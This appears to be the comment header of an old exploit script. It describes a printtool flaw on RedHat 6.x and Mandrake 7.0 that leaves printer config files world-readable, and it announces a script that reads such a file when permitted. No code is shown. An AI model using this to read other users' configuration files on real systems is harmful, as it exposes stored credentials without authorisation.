# printtool is an X11 printer configuration tool shipped with
# RedHat Linux and possibly other linux distributions.
# When configuring a printer with printtool, the permissions
# of the config file are set world-readable. This is shown by
# an example in a bugtraq post regarding this vulnerability:
#
# Affected:
#  MandrakeSoft Linux Mandrake 7.0
#  RedHat Linux 6.2
#  RedHat Linux 6.1 i386

# A simple script that tells you whether or not you have permission to
# read a file. If you do, it cats it.
